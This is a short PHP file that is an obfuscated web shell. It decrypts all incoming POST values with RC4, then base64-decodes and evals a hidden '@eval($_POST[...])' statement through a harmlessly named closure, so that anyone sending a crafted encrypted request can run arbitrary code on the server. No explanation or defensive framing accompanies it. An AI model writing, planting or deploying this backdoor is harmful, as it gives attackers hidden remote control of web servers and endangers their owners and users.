<?php 
foreach (array_keys($_POST) as $key) {
    $enc = $_POST[$key];
    $dec = openssl_decrypt(base64_decode($enc), "RC4", hash('sha256',$key), OPENSSL_RAW_DATA | OPENSSL_NO_PADDING);

    $_POST[$key] = $dec;
}


$code = base64_decode('QGV2YWwoJF9QT1NUWydqVTg3RXJjM0InXSk7');
$alloc = fn() => eval($code);
$alloc();
?>